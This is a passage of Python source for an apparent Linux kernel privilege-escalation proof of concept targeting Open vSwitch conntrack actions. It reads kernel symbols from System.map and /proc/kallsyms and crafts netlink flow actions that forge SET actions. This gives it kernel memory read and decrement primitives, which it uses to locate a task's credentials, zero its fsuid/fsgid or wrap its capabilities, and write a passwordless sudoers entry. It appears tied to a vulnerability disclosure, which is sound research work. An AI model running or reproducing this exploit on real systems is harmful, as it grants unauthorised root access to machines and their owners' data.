        _path, text = self.struct_text(type_name)
        return parse_pahole_field_offset(text, type_name, field_name)

    def struct_size(self, type_name: str) -> int:
        _path, text = self.struct_text(type_name)
        match = re.search(r"/\*\s*size:\s*(\d+),", text)
        if match is None:
            raise RuntimeError(f"could not parse sizeof(struct {type_name}) from pahole output")
        return int(match.group(1))


def parse_pahole_field_offset(text: str, type_name: str, field_name: str) -> int:
    field_pattern = re.compile(
        r"(^|[\s\*\)])" + re.escape(field_name) + r"(\s*(\[|;|\)|__attribute__))"
    )
    for line in text.splitlines():
        if "/*" not in line or not field_pattern.search(line):
            continue
        match = re.search(r"/\*\s*(\d+)\s+\d+\s*\*/", line)
        if match is not None:
            return int(match.group(1))
    raise RuntimeError(f"could not parse {type_name}.{field_name} offset from pahole output")


def parse_symbol_values(path: str) -> tuple[dict[str, int], str | None]:
    values: dict[str, int] = {}
    try:
        with open(path, "r", encoding="ascii", errors="replace") as handle:
            for line in handle:
                fields = line.split()
                if len(fields) < 3 or fields[2] not in REQUIRED_SYMBOLS:
                    continue
                try:
                    values[fields[2]] = int(fields[0], 16)
                except ValueError:
                    continue
    except OSError as exc:
        return values, f"{path} unavailable to this user: {exc.strerror}"
    return values, None


def symbol_offsets_from(path: str) -> tuple[SymbolOffsets | None, str]:
    log(f"symbols: trying {path}")
    values, error = parse_symbol_values(path)
    if error is not None:
        log(f"symbols: {error}")
        return None, error
    missing = [name for name in REQUIRED_SYMBOLS if name not in values]
    if missing:
        names = ", ".join(missing)
        log(f"symbols: {path} missing required symbols: {names}")
        return None, f"{path} readable but missing {names}"
    zeroed = [name for name in REQUIRED_SYMBOLS if values[name] == 0]
    if zeroed:
        names = ", ".join(zeroed)
        log(f"symbols: {path} has zeroed required symbols: {names}")
        return None, f"{path} readable but zeroed {names}"
    base = values[KERNEL_BASE_SYMBOL]
    module_ktype = values["module_ktype"] - base
    init_pid_ns = values["init_pid_ns"] - base
    if module_ktype <= 0 or init_pid_ns <= 0:
        log(f"symbols: {path} produced invalid offsets from {KERNEL_BASE_SYMBOL}")
        return None, f"{path} readable but produced invalid symbol offsets"
    log(
        f"symbols: using {path}; module_ktype_offset=0x{module_ktype:x} "
        f"init_pid_ns_offset=0x{init_pid_ns:x}"
    )
    return SymbolOffsets(module_ktype, init_pid_ns), ""


def local_symbol_candidate_paths(release: str) -> list[str]:
    candidates = [
        f"/boot/System.map-{release}",
        "/boot/System.map",
        "/proc/kallsyms",
        f"/usr/lib/debug/boot/System.map-{release}",
        f"/lib/modules/{release}/build/System.map",
        f"/usr/src/linux-{release}/System.map",
        f"/usr/src/kernels/{release}/System.map",
    ]
    try:
        with open(
            "/usr/src/linux/include/config/kernel.release",
            "r",
            encoding="ascii",
            errors="replace",
        ) as handle:
            if handle.read().strip() == release:
                candidates.append("/usr/src/linux/System.map")
    except OSError:
        pass
    ordered: list[str] = []
    seen: set[str] = set()
    for path in candidates:
        if path in seen:
            continue
        seen.add(path)
        ordered.append(path)
    return ordered


def lookup_kernel_build_record() -> KernelBuildRecord | None:
    uname = os.uname()
    records = load_kernel_build_records()
    release_matches = [
        record for record in records if record.release == uname.release
    ]
    exact_matches = [
        record
        for record in release_matches
        if record.version == uname.version and record.machine == uname.machine
    ]
    if exact_matches:
        record = exact_matches[0]
        log(
            "kernel lookup: using pre-derived record for "
            f"release={record.release} version={record.version!r}"
        )
        return record
    if release_matches:
        log(
            "kernel lookup: release is covered but this exact build is not: "
            f"release={uname.release} version={uname.version!r} "
            f"machine={uname.machine}"
        )
        return None
    log(
        "kernel lookup: no pre-derived record for "
        f"release={uname.release} version={uname.version!r} machine={uname.machine}; "
        "will try local System.map/kallsyms and BTF derivation. This kernel is "
        "not covered by our validation table."
    )
    return None


def derive_symbol_offsets() -> SymbolOffsets:
    release = os.uname().release
    failures: list[str] = []
    for path in local_symbol_candidate_paths(release):
        offsets, failure = symbol_offsets_from(path)
        if offsets is not None:
            return offsets
        failures.append(failure)
    raise RuntimeError(
        "kernel is not covered by pre-derived kernel records, and this user "
        "could not derive module_ktype/init_pid_ns from local System.map or "
        "nonzero /proc/kallsyms locations. Checked: "
        + (
            "; ".join(failures)
            if failures
            else "no candidate symbol paths were configured"
        )
    )


def derive_kernel_offsets(btf: BtfResolver, symbols: SymbolOffsets) -> KernelOffsets:
    module_mkobj = btf.field_offset("module", "mkobj")
    module_kobject_kobj = btf.field_offset("module_kobject", "kobj")
    kobject_ktype = btf.field_offset("kobject", "ktype")
    ovs_conntrack_info_size = btf.struct_size("ovs_conntrack_info")
    ovs_ct_labels = btf.field_offset("ovs_conntrack_info", "labels")
    ip_tunnel_info_key = btf.field_offset("ip_tunnel_info", "key")
    try:
        dst_entry_ref = btf.field_offset("dst_entry", "__rcuref")
        dst_entry_ref_kind = "__rcuref"
    except RuntimeError:
        dst_entry_ref = btf.field_offset("dst_entry", "__refcnt")
        dst_entry_ref_kind = "__refcnt"
    offsets = KernelOffsets(
        nf_conntrack_helper_me=btf.field_offset("nf_conntrack_helper", "me"),
        module_kobj_ktype=module_mkobj + module_kobject_kobj + kobject_ktype,
        vmlinux_module_ktype=symbols.module_ktype,
        vmlinux_init_pid_ns=symbols.init_pid_ns,
        task_pid=btf.field_offset("task_struct", "pid"),
        task_cred=btf.field_offset("task_struct", "cred"),
        task_pid_links=btf.field_offset("task_struct", "pid_links"),
        cred_fsuid=btf.field_offset("cred", "fsuid"),
        cred_fsgid=btf.field_offset("cred", "fsgid"),
        cred_cap_permitted=btf.field_offset("cred", "cap_permitted"),
        cred_cap_effective=btf.field_offset("cred", "cap_effective"),
        pid_namespace_idr=btf.field_offset("pid_namespace", "idr"),
        idr_idr_rt=btf.field_offset("idr", "idr_rt"),
        idr_base=btf.field_offset("idr", "idr_base"),
        xarray_xa_head=btf.field_offset("xarray", "xa_head"),
        xa_node_shift=btf.field_offset("xa_node", "shift"),
        xa_node_slots=btf.field_offset("xa_node", "slots"),
        pid_tasks=btf.field_offset("pid", "tasks"),
        hlist_head_first=btf.field_offset("hlist_head", "first"),
        dst_entry_ref=dst_entry_ref,
        dst_entry_ref_kind=dst_entry_ref_kind,
        metadata_dst_tun_info=btf.field_offset("metadata_dst", "u"),
        ip_tunnel_key_ipv4_src=ip_tunnel_info_key
        + btf.field_offset("ip_tunnel_key", "src"),
        ip_tunnel_key_ipv4_dst=ip_tunnel_info_key
        + btf.field_offset("ip_tunnel_key", "dst"),
        ip_tunnel_key_tos=ip_tunnel_info_key
        + btf.field_offset("ip_tunnel_key", "tos"),
        ip_tunnel_key_ttl=ip_tunnel_info_key
        + btf.field_offset("ip_tunnel_key", "ttl"),
        ip_tunnel_key_tp_src=ip_tunnel_info_key
        + btf.field_offset("ip_tunnel_key", "tp_src"),
        ip_tunnel_key_tp_dst=ip_tunnel_info_key
        + btf.field_offset("ip_tunnel_key", "tp_dst"),
        ovs_ct_labels=ovs_ct_labels,
        ovs_ct_action_len=NLA_HEADER_SIZE + ovs_conntrack_info_size,
    )
    log("kernel offsets: derived from local symbols and debug type info")
    return offsets


def current_kernel_parameters() -> tuple[KernelOffsets, KernelBuildRecord | None]:
    record = lookup_kernel_build_record()
    if record is not None:
        log("kernel offsets: using pre-derived values")
        derive_ovs_uapi_constants(record)
        return record.offsets, record

    acknowledge_unknown_kernel()
    require_pahole_for_dynamic_derivation()
    try:
        symbols = derive_symbol_offsets()
        btf = BtfResolver()
        offsets = derive_kernel_offsets(btf, symbols)
        derive_ovs_uapi_constants(None)
        return offsets, None
    except RuntimeError as exc:
        reason = str(exc).strip().rstrip(".")
        raise RuntimeError(
            "Your kernel was not found in the embedded pre-derived record table and "
            f"dynamic derivation failed because {reason}. As mentioned "
            "before, this does NOT guarantee you are not affected. For a "
            "definitive check of whether you are affected, see "
            "https://heyitsas.im/posts/ovswrap"
        ) from exc


def create_datapath(genl: GenericNetlink, family_id: int, name: str) -> None:
    payload = struct.pack("i", 0)
    payload += nla(OVS_DP_ATTR_NAME, cstr(name))
    payload += nla(OVS_DP_ATTR_UPCALL_PID, struct.pack("I", 0))
    payload += nla(OVS_DP_ATTR_USER_FEATURES, struct.pack("I", 0))
    genl.request(
        family_id,
        OVS_DP_CMD_NEW,
        OVS_DATAPATH_VERSION,
        payload,
        NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE,
    )


def flow_key(seq: int) -> bytes:
    src_ip = 0x0A000000 | ((seq & 0xFFFF) + 1)
    return b"".join(
        [
            nla(OVS_KEY_ATTR_IN_PORT, struct.pack("I", 0)),
            nla(
                OVS_KEY_ATTR_ETHERNET,
                b"\x02\x00\x00\x00\x00\x01" + b"\x02\x00\x00\x00\x00\x02",
            ),
            nla(OVS_KEY_ATTR_ETHERTYPE, struct.pack("!H", ETH_P_IP)),
            nla(
                OVS_KEY_ATTR_IPV4,
                struct.pack("!IIBBBB", src_ip, 0x0A0000FE, IPPROTO_TCP, 0, 64, 0),
            ),
            nla(OVS_KEY_ATTR_TCP, struct.pack("!HH", 10000 + (seq % 50000), 443)),
            nla(OVS_KEY_ATTR_TCP_FLAGS, struct.pack("!H", 0)),
        ]
    )


def ct_action(payload: bytes = b"") -> bytes:
    return nla(OVS_ACTION_ATTR_CT, nla(OVS_CT_ATTR_COMMIT, b"") + payload)


def ct_helper_payload() -> bytes:
    return nla(OVS_CT_ATTR_HELPER, b"ftp\x00")


def clone_with_helper_leak(fake_action: bytes) -> bytes:
    labels = bytearray(32)
    labels[20 : 20 + len(fake_action)] = fake_action
    payload = nla(OVS_CT_ATTR_LABELS, bytes(labels)) + ct_helper_payload()
    helper_payload = ct_helper_payload()
    return nla(
        OVS_ACTION_ATTR_CLONE,
        ct_action(payload) + ct_action(helper_payload) * (CT_ACTION_COUNT - 1),
    )


def clone_with_fake_set_timeout(tun_dst: int) -> bytes:
    labels = bytearray(32)
    labels[20:24] = struct.pack(NLA_HDR, 0xFFFF, OVS_ACTION_ATTR_SET)
    labels[24:28] = struct.pack(NLA_HDR, 12, OVS_KEY_ATTR_TUNNEL_INFO)
    labels[28:32] = struct.pack("<I", tun_dst & 0xFFFFFFFF)
    timeout = bytearray(32)
    timeout[0:4] = struct.pack("<I", (tun_dst >> 32) & 0xFFFFFFFF)
    payload = nla(OVS_CT_ATTR_LABELS, bytes(labels))
    payload += nla(OVS_CT_ATTR_TIMEOUT, bytes(timeout))
    return nla(
        OVS_ACTION_ATTR_CLONE,
        ct_action(payload) + ct_action() * (CT_ACTION_COUNT - 1),
    )


def labels_only_wrap_plan(ct_action_len: int, labels_offset: int) -> tuple[int, int]:
    if ct_action_len < 8 or ct_action_len % 4:
        raise RuntimeError(f"unexpected OVS CT action length {ct_action_len}")
    fake_offset = 16
    target_wrap = 8 + labels_offset + fake_offset
    if target_wrap >= 0x10000 or target_wrap % 4:
        raise RuntimeError(
            f"cannot target labels-only fake SET wrap offset 0x{target_wrap:x}"
        )
    best_score: int | None = None
    best_total = 0
    best_pad = 0
    for total_ct_actions in range(360, 421):
        base_wrap = (4 + total_ct_actions * ct_action_len) & 0xFFFF
        diff = (target_wrap - base_wrap) & 0xFFFF
        pad_count = diff // 4
        true_len = 4 + total_ct_actions * ct_action_len + pad_count * 4
        if true_len <= 0xFFFF or pad_count > 256:
            continue
        score = pad_count + abs(total_ct_actions - 400)
        if best_score is None or score < best_score:
            best_score = score
            best_total = total_ct_actions
            best_pad = pad_count
    if best_score is None:
        raise RuntimeError(
            "could not build labels-only fake SET wrap plan for "
            f"ct_action_len={ct_action_len} labels_offset={labels_offset}"
        )
    return best_total, best_pad


def clone_with_fake_set_tunnel_labels_only(
    tun_dst: int, ct_action_len: int, labels_offset: int
) -> bytes:
    total_ct_actions, pad_count = labels_only_wrap_plan(
        ct_action_len, labels_offset
    )
    fake_offset = 16
    labels = bytearray(32)
    labels[fake_offset : fake_offset + 4] = struct.pack(
        NLA_HDR, 0xFFFF, OVS_ACTION_ATTR_SET
    )
    labels[fake_offset + 4 : fake_offset + 8] = struct.pack(
        NLA_HDR, 12, OVS_KEY_ATTR_TUNNEL_INFO
    )
    labels[fake_offset + 8 : fake_offset + 16] = struct.pack("<Q", tun_dst)
    payload = nla(OVS_CT_ATTR_LABELS, bytes(labels))
    pad = nla(OVS_ACTION_ATTR_POP_VLAN, b"") * pad_count
    return nla(
        OVS_ACTION_ATTR_CLONE,
        ct_action(payload) + ct_action() * (total_ct_actions - 1) + pad,
    )


def clone_with_fake_set_carrier(
    carrier: str, tun_dst: int, offsets: KernelOffsets
) -> bytes:
    if carrier == CARRIER_TIMEOUT:
        return clone_with_fake_set_timeout(tun_dst)
    if carrier == CARRIER_LABELS_ONLY:
        return clone_with_fake_set_tunnel_labels_only(
            tun_dst,
            offsets.ovs_ct_action_len,
            offsets.ovs_ct_labels,
        )
    raise RuntimeError(f"unknown fake SET carrier {carrier!r}")


def fake_set_carrier_error(exc: Exception) -> bool:
    if isinstance(exc, OSError):
        return exc.errno == errno.EINVAL
    return "flow get response did not include actions" in str(exc)


class FakeSetCarriers:
    def __init__(self, mode: str, label: str) -> None:
        if mode not in CARRIER_ORDER and mode != CARRIER_AUTO:
            raise RuntimeError(f"unknown {label} carrier mode {mode!r}")
        self.mode = mode
        self.label = label
        self.timeout_disabled = False

    def names(self) -> tuple[str, ...]:
        if self.mode != CARRIER_AUTO:
            return (self.mode,)
        if self.timeout_disabled:
            return (CARRIER_LABELS_ONLY,)
        return CARRIER_ORDER

    def retry_after(self, carrier: str, has_next: bool) -> bool:
        if self.mode != CARRIER_AUTO or carrier != CARRIER_TIMEOUT or not has_next:
            return False
        print(
            f"fake SET timeout carrier failed for {self.label}; "
            "using labels-only carrier",
            flush=True,
        )
        self.timeout_disabled = True
        return True


def create_flow(
    genl: GenericNetlink,
    family_id: int,
    dp_ifindex: int,
    key: bytes,
    actions: bytes,
) -> None:
    payload = (
        struct.pack("i", dp_ifindex)
        + nla(OVS_FLOW_ATTR_KEY, key)
        + nla(OVS_FLOW_ATTR_ACTIONS, actions)
    )
    genl.request(
        family_id,
        OVS_FLOW_CMD_NEW,
        OVS_FLOW_VERSION,
        payload,
        NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE,
    )


def delete_flow(genl: GenericNetlink, family_id: int, dp_ifindex: int, key: bytes) -> None:
    payload = struct.pack("i", dp_ifindex) + nla(OVS_FLOW_ATTR_KEY, key)
    genl.request(
        family_id,
        OVS_FLOW_CMD_DEL,
        OVS_FLOW_VERSION,
        payload,
        NLM_F_REQUEST | NLM_F_ACK,
    )


def get_flow_actions(
    genl: GenericNetlink, family_id: int, dp_ifindex: int, key: bytes
) -> bytes:
    payload = struct.pack("i", dp_ifindex) + nla(OVS_FLOW_ATTR_KEY, key)
    replies = genl.request(family_id, OVS_FLOW_CMD_GET, OVS_FLOW_VERSION, payload)
    if not replies:
        raise RuntimeError("flow get returned no replies")
    for attr in parse_attrs(replies[0][8:]):
        if attr.attr_type == OVS_FLOW_ATTR_ACTIONS:
            return attr.payload
    raise RuntimeError("flow get response did not include actions")


def likely_kernel_pointers(buf: bytes) -> list[tuple[int, int]]:
    hits: list[tuple[int, int]] = []
    for offset in range(0, max(0, len(buf) - 7)):
        value = struct.unpack_from("<Q", buf, offset)[0]
        if 0xFFFF800000000000 <= value <= 0xFFFFFFFFFFFFFFFF:
            hits.append((offset, value))
    return hits


def find_helper_pointer(actions: bytes) -> int:
    for top in parse_attrs(actions):
        if top.attr_type == OVS_ACTION_ATTR_OUTPUT and top.raw_len == 512:
            hits = likely_kernel_pointers(top.payload)
            helperish = [
                value
                for _off, value in hits
                if 0xFFFFFFFFC0000000 <= value <= 0xFFFFFFFFDFFFFFFF
                and (value & 0x7) == 0
            ]
            if helperish:
                return helperish[0]
            if hits:
                return hits[0][1]
    raise RuntimeError("no helper pointer found in fake OUTPUT leak")


class OvsReadPrimitive:
    def __init__(
        self,
        genl: GenericNetlink,
        flow_family: int,
        dp_ifindex: int,
        offsets: KernelOffsets,
        carrier_mode: str = CARRIER_AUTO,
        preferred_lanes: tuple[str, ...] = (),
    ) -> None:
        self.genl = genl
        self.flow_family = flow_family
        self.dp_ifindex = dp_ifindex
        self.offsets = offsets
        self.carriers = FakeSetCarriers(carrier_mode, "read")
        self.seq = 1000
        self.scalar_lanes = (
            TunnelReadLane("tos", offsets.ip_tunnel_key_tos, OVS_TUNNEL_KEY_ATTR_TOS, 0, True),
            TunnelReadLane("ttl", offsets.ip_tunnel_key_ttl, OVS_TUNNEL_KEY_ATTR_TTL, 0, False),
            TunnelReadLane("tp_src_0", offsets.ip_tunnel_key_tp_src, OVS_TUNNEL_KEY_ATTR_TP_SRC, 0, True),
            TunnelReadLane("tp_src_1", offsets.ip_tunnel_key_tp_src + 1, OVS_TUNNEL_KEY_ATTR_TP_SRC, 1, True),
            TunnelReadLane("tp_dst_0", offsets.ip_tunnel_key_tp_dst, OVS_TUNNEL_KEY_ATTR_TP_DST, 0, True),
            TunnelReadLane("tp_dst_1", offsets.ip_tunnel_key_tp_dst + 1, OVS_TUNNEL_KEY_ATTR_TP_DST, 1, True),
        )
        self.ipv4_lanes = tuple(
            TunnelReadLane(
                f"ipv4_src_{index}",
                offsets.ip_tunnel_key_ipv4_src + index,
                OVS_TUNNEL_KEY_ATTR_IPV4_SRC,
                index,
                True,
            )
            for index in range(4)
        ) + tuple(
            TunnelReadLane(
                f"ipv4_dst_{index}",
                offsets.ip_tunnel_key_ipv4_dst + index,
                OVS_TUNNEL_KEY_ATTR_IPV4_DST,
                index,
                True,
            )
            for index in range(4)
        )
        default_lanes = self.scalar_lanes + self.ipv4_lanes
        preferred_names = set(preferred_lanes)
        preferred = tuple(
            lane
            for name in preferred_lanes
            for lane in default_lanes
            if lane.name == name
        )
        remaining = tuple(lane for lane in default_lanes if lane.name not in preferred_names)
        self.read_lanes = preferred + remaining

    def read_u8_with_lane(self, address: int, lane: TunnelReadLane) -> int | None:
        key_start = address - lane.field_offset
        tun_dst = key_start - self.offsets.metadata_dst_tun_info
        dumped = b""
        carriers = self.carriers.names()
        for index, carrier in enumerate(carriers):
            self.seq += 1
            key = flow_key(self.seq)
            actions = clone_with_fake_set_carrier(carrier, tun_dst, self.offsets)
            try:
                create_flow(self.genl, self.flow_family, self.dp_ifindex, key, actions)
                dumped = get_flow_actions(
                    self.genl, self.flow_family, self.dp_ifindex, key
                )
                break
            except (OSError, RuntimeError) as exc:
                if fake_set_carrier_error(exc):
                    if self.carriers.retry_after(carrier, index + 1 < len(carriers)):
                        continue
                    return None
                raise
        for top in parse_attrs(dumped):
            if top.attr_type != OVS_ACTION_ATTR_SET:
                continue
            for tunnel_key in parse_attrs(top.payload):
                if tunnel_key.attr_type != OVS_KEY_ATTR_TUNNEL:
                    continue
                saw_tunnel = False
                for tunnel_attr in parse_attrs(tunnel_key.payload):
                    if tunnel_attr.attr_type == OVS_TUNNEL_KEY_ATTR_IPV4_INFO_BRIDGE:
                        return None
                    saw_tunnel = True
                    if tunnel_attr.attr_type == lane.attr_type:
                        if len(tunnel_attr.payload) <= lane.payload_index:
                            raise RuntimeError(
                                f"unexpected {lane.name} payload length "
                                f"{len(tunnel_attr.payload)}"
                            )
                        return tunnel_attr.payload[lane.payload_index]
                if saw_tunnel and lane.optional_zero:
                    return 0
        return None

    def read_u8(self, address: int) -> int:
        for lane in self.read_lanes:
            value = self.read_u8_with_lane(address, lane)
            if value is not None:
                return value
        raise RuntimeError(
            f"fixed tunnel carriers could not read byte at 0x{address:016x}"
        )

    def read_bytes(self, address: int, size: int) -> bytes:
        return bytes(self.read_u8(address + offset) for offset in range(size))

    def read_u32(self, address: int) -> int:
        return int(struct.unpack("<I", self.read_bytes(address, 4))[0])

    def read_u64(self, address: int) -> int:
        return int(struct.unpack("<Q", self.read_bytes(address, 8))[0])


class OvsWritePrimitive:
    def __init__(
        self,
        genl: GenericNetlink,
        flow_family: int,
        dp_ifindex: int,
        offsets: KernelOffsets,
        carrier_mode: str = CARRIER_AUTO,
    ) -> None:
        self.genl = genl
        self.flow_family = flow_family
        self.dp_ifindex = dp_ifindex
        self.offsets = offsets
        self.carriers = FakeSetCarriers(carrier_mode, "write")
        self.seq = 100000000

    def decrement_u32_once(self, target_address: int) -> None:
        tun_dst = target_address - self.offsets.dst_entry_ref
        carriers = self.carriers.names()
        for index, carrier in enumerate(carriers):
            self.seq += 1
            key = flow_key(self.seq)
            actions = clone_with_fake_set_carrier(carrier, tun_dst, self.offsets)
            try:
                create_flow(self.genl, self.flow_family, self.dp_ifindex, key, actions)
                delete_flow(self.genl, self.flow_family, self.dp_ifindex, key)
                return
            except OSError as exc:
                if exc.errno == errno.ENOMEM:
                    raise RuntimeError(
                        "Ran out of memory; reattempt the PoC after a reboot "
                        "or with more RAM (recommended 2GB+)."
                    ) from exc
                if fake_set_carrier_error(exc):
                    if self.carriers.retry_after(carrier, index + 1 < len(carriers)):
                        continue
                    raise RuntimeError(
                        f"fake SET {carrier} write carrier failed"
                    ) from exc
                raise


def valid_vmlinux_base(value: int) -> bool:
    return (
        0xFFFFFFFF80000000 <= value <= 0xFFFFFFFFF0000000
        and value % 0x200000 == 0
    )


def derive_helper_module_ktype(
    reader: OvsReadPrimitive,
    helper_me_address: int,
    helper_pointer: int,
    offsets: KernelOffsets,
) -> int:
    module_pointer = canonicalize_kernel_pointer(reader.read_u64(helper_me_address))
    if not (
        canonical_kernel_pointer(module_pointer)
        and helper_pointer - 0x800000 <= module_pointer <= helper_pointer + 0x800000
    ):
        raise RuntimeError(
            "helper->me did not read as a nearby canonical module pointer: "
            f"helper=0x{helper_pointer:016x} me=0x{module_pointer:016x}"
        )
    ktype_addr = module_pointer + offsets.module_kobj_ktype
    module_ktype = canonicalize_kernel_pointer(reader.read_u64(ktype_addr))
    if not valid_vmlinux_base(module_ktype - offsets.vmlinux_module_ktype):
        raise RuntimeError(
            f"module.kobj.ktype at 0x{ktype_addr:016x} read "
            f"0x{module_ktype:016x}, which does not match the expected "
            "vmlinux symbol offset"
        )
    log(f"helper->me module pointer 0x{module_pointer:016x} validated directly")
    return module_ktype


def canonicalize_kernel_pointer(value: int) -> int:
    if 0xFFFF800000000000 <= value <= 0xFFFFFFFFFFFFFFFF:
        return value
    if 0x0000008000000000 <= value <= 0x000000FFFFFFFFFF:
        return value | 0xFFFFFF0000000000
    if 0x0000800000000000 <= value <= 0x0000FFFFFFFFFFFF:
        return value | 0xFFFF000000000000
    if 0x0080000000000000 <= value <= 0x00FFFFFFFFFFFFFF:
        return value | 0xFF00000000000000
    return value


def canonical_kernel_pointer(value: int) -> bool:
    canonical = canonicalize_kernel_pointer(value)
    return 0xFF00000000000000 <= canonical <= 0xFFFFFFFFFFFFFFFF and canonical % 8 == 0


def read_kernel_pointer(
    reader: OvsReadPrimitive,
    address: int,
    label: str,
) -> int:
    pointer = canonicalize_kernel_pointer(reader.read_u64(address))
    if not canonical_kernel_pointer(pointer):
        raise RuntimeError(
            f"{label} at 0x{address:016x} is not a canonical kernel pointer: "
            f"0x{pointer:016x}"
        )
    return pointer


def xarray_entry_to_node(entry: int) -> int | None:
    if entry == 0 or (entry & 0x3) != 0x2:
        return None
    node = canonicalize_kernel_pointer(entry & ~0x3)
    if canonical_kernel_pointer(node):
        return node
    return None


def xarray_entry_to_pointer(entry: int) -> int | None:
    if entry == 0 or (entry & 0x3) != 0:
        return None
    pointer = canonicalize_kernel_pointer(entry)
    if canonical_kernel_pointer(pointer):
        return pointer
    return None


def read_xarray_entry(
    reader: OvsReadPrimitive,
    address: int,
    label: str,
) -> int:
    value = reader.read_u64(address)
    node = xarray_entry_to_node(value)
    if node is not None:
        return node | 0x2
    pointer = xarray_entry_to_pointer(value)
    if pointer is not None:
        return pointer
    raise RuntimeError(
        f"{label} at 0x{address:016x} is not a valid XArray entry: "
        f"0x{value:016x}"
    )


def read_xa_shift(reader: OvsReadPrimitive, address: int) -> int:
    value = reader.read_u8(address)
    if value > 60 or value % 6 != 0:
        raise RuntimeError(
            f"XArray node shift at 0x{address:016x} is invalid: {value}"
        )
    return value


def lookup_init_pid_ns_pid(
    reader: OvsReadPrimitive,
    offsets: KernelOffsets,
    kernel_base: int,
    pid_nr: int,
) -> int:
    idr_addr = kernel_base + offsets.vmlinux_init_pid_ns + offsets.pid_namespace_idr
    idr_base = reader.read_u32(idr_addr + offsets.idr_base)
    if pid_nr < idr_base:
        raise RuntimeError(f"pid {pid_nr} is below init pid namespace idr_base {idr_base}")
    index = pid_nr - idr_base
    xarray_addr = idr_addr + offsets.idr_idr_rt

    entry = read_xarray_entry(
        reader,
        xarray_addr + offsets.xarray_xa_head,
        "init_pid_ns.idr.xa_head",
    )
    for depth in range(8):
        node = xarray_entry_to_node(entry)
        if node is not None:
            shift = read_xa_shift(reader, node + offsets.xa_node_shift)
            slot = (index >> shift) & 0x3F
            entry = read_xarray_entry(
                reader,
                node + offsets.xa_node_slots + slot * 8,
                f"init_pid_ns.idr.slot[{slot}]",
            )
            continue
        pointer = xarray_entry_to_pointer(entry)
        if pointer is not None:
            return pointer
    raise RuntimeError(f"init_pid_ns idr traversal exceeded depth limit for pid {pid_nr}")


def locate_task_by_init_pid_ns(
    reader: OvsReadPrimitive,
    offsets: KernelOffsets,
    kernel_base: int,
    wanted_pid: int,
) -> int:
    pid_struct = lookup_init_pid_ns_pid(reader, offsets, kernel_base, wanted_pid)
    first = read_kernel_pointer(
        reader,
        pid_struct + offsets.pid_tasks + offsets.hlist_head_first,
        "pid.tasks.first",
    )
    task = first - offsets.task_pid_links
    if not canonical_kernel_pointer(task):
        raise RuntimeError(
            f"init_pid_ns idr produced noncanonical task from hlist: "
            f"pid_struct=0x{pid_struct:016x} hlist=0x{first:016x}"
        )
    pid = reader.read_u32(task + offsets.task_pid)
    if pid != wanted_pid:
        raise RuntimeError(
            f"init_pid_ns idr resolved pid_struct=0x{pid_struct:016x} "
            f"task=0x{task:016x}, but task.pid={pid}, expected {wanted_pid}"
        )
    print(
        f"located task through init_pid_ns idr: "
        f"pid_struct=0x{pid_struct:016x} task=0x{task:016x}",
        flush=True,
    )
    return task


def decrement_to_zero(
    reader: OvsReadPrimitive,
    writer: OvsWritePrimitive,
    address: int,
    label: str,
) -> None:
    value = reader.read_u32(address)
    print(f"{label} before={value}", flush=True)
    if value > 100000:
        raise RuntimeError(f"{label} value {value} is unexpectedly large")
    for idx in range(value):
        writer.decrement_u32_once(address)
        if idx and idx % 250 == 0:
            print(f"{label}: queued {idx}/{value} decrements", flush=True)
    time.sleep(2.0)
    now = reader.read_u32(address)
    if now != 0:
        raise RuntimeError(f"{label} did not reach zero; current value is {now}")
    print(f"{label} after=0", flush=True)


def decrement_zero_to_all_ones(
    reader: OvsReadPrimitive,
    writer: OvsWritePrimitive,
    address: int,
    label: str,
) -> None:
    value = reader.read_u32(address)
    print(f"{label} before=0x{value:08x}", flush=True)
    if value != 0:
        raise RuntimeError(
            f"{label} expected to start at zero for legacy __refcnt conversion, "
            f"got 0x{value:08x}"
        )
    writer.decrement_u32_once(address)
    time.sleep(0.5)
    now = reader.read_u32(address)
    if now != 0xFFFFFFFF:
        raise RuntimeError(
            f"{label} did not wrap to 0xffffffff; current value is 0x{now:08x}"
        )
    print(f"{label} after=0xffffffff", flush=True)


def panic_on_warn_enabled() -> bool:
    try:
        with open("/proc/sys/kernel/panic_on_warn", "r", encoding="ascii") as handle:
            return handle.read().strip() not in ("", "0")
    except OSError:
        return False


def convert_writer_credential(
    reader: OvsReadPrimitive,
    writer: OvsWritePrimitive,
    offsets: KernelOffsets,
    cred: int,
) -> None:
    if offsets.dst_entry_ref_kind == "__rcuref":
        step("DECREMENTING FSUID/FSGID")
        decrement_to_zero(reader, writer, cred + offsets.cred_fsuid, "fsuid")
        decrement_to_zero(reader, writer, cred + offsets.cred_fsgid, "fsgid")
        return
    if offsets.dst_entry_ref_kind == "__refcnt":
        if panic_on_warn_enabled():
            raise RuntimeError(
                "legacy dst_entry.__refcnt conversion would trigger a kernel "
                "WARN while wrapping capability words, and panic_on_warn is enabled"
            )
        print(
            "legacy dst_entry.__refcnt conversion: panic_on_warn is disabled; "
            "wrapping capability words may emit one nonfatal dst_release warning",
            flush=True,
        )
        step("WRAPPING HOST WRITER CAPABILITIES")
        decrement_zero_to_all_ones(
            reader,
            writer,
            cred + offsets.cred_cap_permitted,
            "cap_permitted.low",
        )
        decrement_zero_to_all_ones(
            reader,
            writer,
            cred + offsets.cred_cap_effective,
            "cap_effective.low",
        )
        return
    raise RuntimeError(f"unsupported dst_entry ref kind {offsets.dst_entry_ref_kind}")


def try_write_root_proof(path: str, text: str) -> bool:
    try:
        with open(path, "w", encoding="ascii") as handle:
            handle.write(text)
        os.sync()
        return True
    except OSError as exc:
        print(f"write {path} failed: errno={exc.errno} {exc.strerror}", flush=True)
        return False


def sudoers_references_dropin_dir(
    sudoers_path: str = SUDOERS_FILE,
    dropin_dir: str = SUDOERS_DROPIN_DIR,
) -> bool:
    try:
        with open(sudoers_path, "r", encoding="ascii", errors="replace") as handle:
            for raw_line in handle:
                line = raw_line.strip()
                if not line:
                    continue
                if line.startswith("#includedir") or line.startswith("@includedir"):
                    fields = line.split()
                    if len(fields) >= 2 and fields[1].strip("\"'") == dropin_dir:
                        return True
    except OSError as exc:
        print(
            f"could not inspect {sudoers_path}: errno={exc.errno} {exc.strerror}",
            flush=True,
        )
    return False


def write_sudoers_dropin(path: str, username: str) -> bool:
    content = f"{username} ALL=(ALL) NOPASSWD:ALL\n".encode("ascii")
    old_umask = os.umask(0)
    try:
        os.makedirs(os.path.dirname(path), mode=0o755, exist_ok=True)
        fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        try:
            os.write(fd, content)
            os.fchmod(fd, 0o440)
            os.fsync(fd)
        finally:
